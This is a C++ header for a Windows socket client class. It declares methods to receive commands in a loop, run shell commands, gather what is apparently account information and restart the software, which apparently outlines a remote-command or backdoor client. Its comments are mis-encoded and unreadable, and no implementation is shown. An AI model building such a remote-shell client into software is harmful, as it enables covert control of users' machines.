#include "Loading.h"

//Socket
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

class SocketClass {
public:
	char* Entrance(); //���
private:
	void SocketStart(); //��Socket
	void SocketStop(SOCKET); //�ر�Socket
	bool Send_Socket(SOCKET, std::string); //����Socket
	std::string Recv_Socket(SOCKET); //����Socket

	void Recv_Socket_While(SOCKET); //ѭ������Socket

	void Socket_RunShell(std::string); //��������
	std::string GetConfig(); //��ȡ�˻���Ϣ�ַ���
	void RebootSoftware(); //�������
	SOCKADDR_IN Socket_Initialization(); //Initialization Socket

private:
	static bool SocketStopFlac; //�Ƿ�ֹͣSocket
	std::string GetIpByName(std::string); //������ȡIP
};